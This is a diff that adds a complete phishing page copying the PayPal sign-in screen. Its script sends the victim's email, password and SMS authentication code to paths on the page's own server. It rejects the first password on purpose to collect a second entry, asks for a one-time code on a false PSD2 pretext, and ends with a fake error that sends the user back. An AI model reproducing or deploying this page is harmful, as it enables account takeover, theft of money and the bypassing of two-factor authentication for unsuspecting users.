@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Log in to your PayPal account</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
+        <link rel="icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" />
+    </head>
+    <body style="font-family: Helvetica, Arial, sans-serif">
+        <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+            <symbol id="warning" fill="currentColor" viewBox="0 0 16 16">
+                <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"/>
+            </symbol>
+        </svg>
+        
+        <div class="container-fluid" style="width: 480px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%)">
+            <div class="card" style="padding: 32px">
+                <div class="card-body" style="padding: 16px; text-align: center">
+                    <img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg" />
+                </div>
+                
+                <!-- Loading -->
+                <div id="tab_loading">
+                    <div class="card-body" style="padding: 64px; text-align: center">
+                        <div class="spinner-border text-primary" style="width: 64px; height: 64px">
+                            <span class="sr-only"></span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Login -->
+                <div id="tab_signin" hidden>
+                    <div id="signin_error" class="card-body" style="padding: 8px" hidden>
+                        <div class="alert alert-danger d-flex align-items-center" role="alert">
+                            <svg class="bi flex-shrink-0 me-2" width="24" height="24">
+                                <use xlink:href="#warning"/>
+                            </svg>
+                            <div>Please check your entries and try again.</div>
+                        </div>
+                    </div>
+                    
+                    <div class="card-body" style="padding: 8px">
+                        <div class="form-group">
+                            <input id="signin_username" class="form-control form-control-lg" style="font-size: 16px; border-color: rgb(171, 173, 176)" type="username" placeholder="Email or mobile number" />
+                        </div>
+                    </div>
+                    
+                    <div class="card-body" style="padding: 8px">
+                        <div class="form-group">
+                            <input id="signin_password" class="form-control form-control-lg" style="font-size: 16px; border-color: rgb(171, 173, 176)" type="password" placeholder="Password" />
+                        </div>
+                    </div>
+                    
+                    <div class="card-body" style="padding: 8px">
+                        <button id="signin_submit" class="btn btn-lg btn-primary" style="font-size: 16px; font-weight: bold; background-color: rgb(47, 110, 180); width: 100%">Next</button>
+                        
+                        <div style="border-top: 1px solid #cbd2d6; position: relative; margin: 25px 0 10px; text-align: center">
+                            <span style="background-color: #fff; padding: 0.5em; position: relative; color: #6c7378; top: -0.7em">or</span>
+                        </div>
+                        
+                        <button id="signin_signup" class="btn btn-lg btn-light" style="font-size: 16px; font-weight: bold; background-color: rgb(226, 231, 235); width: 100%">Sign up</button>
+                    </div>
+                </div>
+                
+                <!-- Code -->
+                <div id="tab_verify" hidden>
+                    <div id="verify_error" class="card-body" style="padding: 8px" hidden>
+                        <div class="alert alert-danger d-flex align-items-center" role="alert">
+                            <svg class="bi flex-shrink-0 me-2" width="24" height="24">
+                                <use xlink:href="#warning"/>
+                            </svg>
+                            <div>Please check your entries and try again.</div>
+                        </div>
+                    </div>
+                    
+                    <div class="card-body" style="padding: 8px; text-align: center">
+                        <h3>Authentication required</h3>
+                        <p>As part of the PSD2 Strong Customer Authentication regulation, we need additional information to confirm it's really you.</p>
+                        <p>We've sent you an authentication code to your primary mobile phone number, please enter it below in order to continue.</p>
+                    </div>
+                    
+                    <div class="card-body" style="padding: 8px">
+                        <div class="form-group">
+                            <input id="verify_code" class="form-control form-control-lg" style="font-size: 16px; border-color: rgb(171, 173, 176)" type="password" placeholder="Verification code" />
+                        </div>
+                    </div>
+                    
+                    <div class="card-body" style="padding: 8px">
+                        <button id="verify_submit" class="btn btn-lg btn-primary" style="font-size: 16px; font-weight: bold; background-color: rgb(47, 110, 180); width: 100%">Next</button>
+                    </div>
+                </div>
+                
+                <!-- Done -->
+                <div id="tab_verify_expired" hidden>
+                    <div class="card-body" style="padding: 8px; text-align: center">
+                        <p>Sorry, an unexpected error occurred while processing your request. If this issue persists, please contact customer support. Click continue and you'll be taken back to the merchant.</p>
+                    </div>
+                    
+                    <div class="card-body" style="padding: 8px">
+                        <button id="verify_expired_submit" class="btn btn-lg btn-primary" style="font-size: 16px; font-weight: bold; background-color: rgb(47, 110, 180); width: 100%">Continue</button>
+                    </div>
+                </div>
+                
+                <!-- Languages -->
+                <div class="card-body" style="padding: 8px; padding-top: 32px; font-size: 10px">
+                    <span class="text-muted" style="font-weight: bold">English</span>
+                    <span class="text-muted">|</span>
+                    <span class="text-muted">French</span>
+                    <span class="text-muted">|</span>
+                    <span class="text-muted">Spanish</span>
+                    <span class="text-muted">|</span>
+                    <span class="text-muted">Chinese</span>
+                </div>
+            </div>
+        </div>
+        
+        <script>
+            var signin_attempts = 2;
+            var verify_attempts = 1;
+            
+            function setVisibleTab(tab) {
+                const elements = document.getElementById(tab).parentNode.childNodes;
+                
+                for (let i = 0; i < elements.length; i++) {
+                    if (!elements[i].id) continue;
+                    
+                    if (elements[i].id === tab) {
+                        elements[i].hidden = false;
+                    } else {
+                        elements[i].hidden = true;
+                    }
+                }
+            }
+            
+            window.addEventListener("load", () => {
+                setVisibleTab("tab_signin");
+            });
+        
+            document.getElementById("signin_submit").addEventListener("click", () => {
+                setVisibleTab("tab_loading");
+                
+                document.getElementById("signin_error").hidden = true;
+                
+                if (!document.getElementById("signin_username").value) {
+                    document.getElementById("signin_error").hidden = false;
+                    setVisibleTab("tab_signin");
+                    return;
+                }
+                
+                if (!document.getElementById("signin_password").value) {
+                    document.getElementById("signin_error").hidden = false;
+                    setVisibleTab("tab_signin");
+                    return;
+                }
+                
+                signin_attempts--;
+                
+                fetch(`/@/PayPal/SignIn${window.location.search}`, {
+                    method: "POST",
+                    headers: {
+                        "Accept": "application/json",
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        Username: document.getElementById("signin_username").value,
+                        Password: document.getElementById("signin_password").value
+                    })
+                })
+                .then((response) => {
+                    if (signin_attempts >= 1) {
+                        document.getElementById("signin_error").hidden = false;
+                        document.getElementById("signin_password").value = "";
+                        setVisibleTab("tab_signin");
+                    } else {
+                        setVisibleTab("tab_verify");
+                    }
+                });
+            });
+        
+            document.getElementById("verify_submit").addEventListener("click", () => {
+                setVisibleTab("tab_loading");
+                
+                document.getElementById("verify_error").hidden = true;
+                
+                if (!document.getElementById("verify_code").value) {
+                    document.getElementById("verify_error").hidden = false;
+                    setVisibleTab("tab_verify");
+                    return;
+                }
+                
+                verify_attempts--;
+                
+                fetch(`/@/PayPal/SignInVerify${window.location.search}`, {
+                    method: "POST",
+                    headers: {
+                        "Accept": "application/json",
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        Code: document.getElementById("verify_code").value
+                    })
+                })
+                .then((response) => {
+                    if (verify_attempts >= 1) {
+                        document.getElementById("verify_error").hidden = false;
+                        setVisibleTab("tab_verify");
+                    } else {
+                        setVisibleTab("tab_verify_expired");
+                    }
+                });
+            });
+        
+            document.getElementById("verify_expired_submit").addEventListener("click", () => {
+                window.history.back();
+            });
+        </script>
+    </body>
+</html>
